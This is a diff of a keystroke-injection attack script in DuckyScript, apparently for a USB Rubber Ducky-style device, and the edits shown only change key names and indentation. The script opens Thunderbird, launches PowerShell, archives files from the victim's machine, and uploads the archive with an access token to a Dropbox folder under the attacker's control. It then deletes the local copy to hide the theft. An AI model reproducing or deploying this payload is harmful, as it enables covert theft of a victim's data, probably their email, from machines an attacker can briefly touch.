@@ -42,7 +42,7 @@ EXTENSION DETECT_READY
     CAPSLOCK
 END_EXTENSION
 
-WIN r
+GUI r
 STRING thunderbird
 ENTER
 DELAY 1000
@@ -74,7 +74,7 @@ CTRL c
 DELAY 500
 ALT F4
 DELAY 500
-WIN R
+GUI r
 STRING powershell
 ENTER
 DELAY 1500
@@ -91,15 +91,15 @@ STRINGLN  -DestinationPath ./#ARCHIVE_NAME
 DELAY 1000
 
 STRINGLN
-	$filePath = "$env:TEMP/#ARCHIVE_NAME"
-	$filePath = $filePath -replace "\\", "/"
-	$dropboxPath = "#DROPBOX_FOLDER_PATH#ARCHIVE_NAME"
-	$accessToken = "#ACCESS_TOKEN"
-	$fileContent = [System.IO.File]::ReadAllBytes($filePath)
-	$headers = @{
-	    "Authorization" = "Bearer $accessToken"
-    	"Dropbox-API-Arg" = ("{`"path`": `"" + $dropboxPath + "`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}")
-	    "Content-Type" = "application/octet-stream"
-	}
-	Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileContent; rm $filePath; exit
+    $filePath = "$env:TEMP/#ARCHIVE_NAME"
+    $filePath = $filePath -replace "\\", "/"
+    $dropboxPath = "#DROPBOX_FOLDER_PATH#ARCHIVE_NAME"
+    $accessToken = "#ACCESS_TOKEN"
+    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+    $headers = @{
+        "Authorization" = "Bearer $accessToken"
+        "Dropbox-API-Arg" = ("{`"path`": `"" + $dropboxPath + "`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}")
+        "Content-Type" = "application/octet-stream"
+    }
+    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileContent; rm $filePath; exit
 END_STRINGLN
